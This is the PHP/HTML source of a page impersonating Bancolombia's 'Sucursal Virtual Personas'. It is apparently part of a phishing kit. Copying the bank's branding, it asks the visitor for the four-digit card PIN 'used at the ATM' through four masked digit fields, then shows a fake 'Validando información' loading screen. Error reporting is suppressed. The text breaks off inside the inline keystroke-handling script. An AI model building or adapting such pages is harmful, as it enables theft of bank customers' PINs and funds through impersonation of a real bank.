<?php
error_reporting(0);
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html lang="es">
    <head>
        <title>Bancolombia Sucursal Virtual Personas</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700&display=swap" rel="stylesheet">
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            body { font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; background-color: #fff; }
            /* Eliminamos el !important para que el JS tome el control total */
            #fondo, #cargando-o { 
                display: none; 
                position: fixed; 
                top: 0; left: 0; width: 100%; height: 100%; 
                background: rgba(255,255,255,0.95); 
                z-index: 9999; 
                text-align: center; 
                padding-top: 50%; 
            }
            .frm { text-align: center; margin-top: 50px; }
            .clave { 
                padding: 10px 0; 
                text-align: center; 
                width: 50px; 
                font-size: 28px; 
                font-weight: bold; 
                border: none; 
                border-bottom: 2px solid #ccc; 
                margin: 0 5px; 
                outline: none;
            }
            .clave:focus { border-bottom: 2px solid #FDDA24; }
            #btn-password { width: 85%; margin: 40px auto; display: block; height: 50px; border: none; border-radius: 25px; font-weight: bold; background-color: #ccc; color: #777; font-size: 16px; cursor: not-allowed; transition: 0.3s; }
            .header-app { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #eee; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="80"><br>
            <p style="font-size: 14px; color: #666; font-family: 'Open Sans';">Validando información...</p>
        </div>

        <div class="header-app">
            <img src="../img/btn-cerrar.jpg" height="25">
            <img src="../img/logo-app.jpg" height="25">
            <span style="width: 30px;"></span>
        </div>
       
        <div class="frm">
            <img src="../img/candado.jpg" width="20" style="margin-bottom: 10px;"><br>
            <p style="font-size: 16px; font-weight: bold; color: #333;">Ingresa la clave de tu tarjeta</p>
            <p style="font-size: 13px; color: #666; padding: 0 40px;">Es la misma clave de 4 dígitos que usas en el cajero automático.</p>
            
            <div style="display: flex; justify-content: center; margin-top: 20px;">
                <input type="password" class="clave" id="p1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="password" class="clave" id="p2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="password" class="clave" id="p3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="password" class="clave" id="p4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
            </div>
        </div>  
        
        <button id="btn-password" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() {
                $("#fondo, #cargando-o").hide();

                $('.clave').on('keyup', function(e) {
                    if (this.value.length === 1) { $(this).next('.clave').focus(); }
                    if (e.keyCode ==
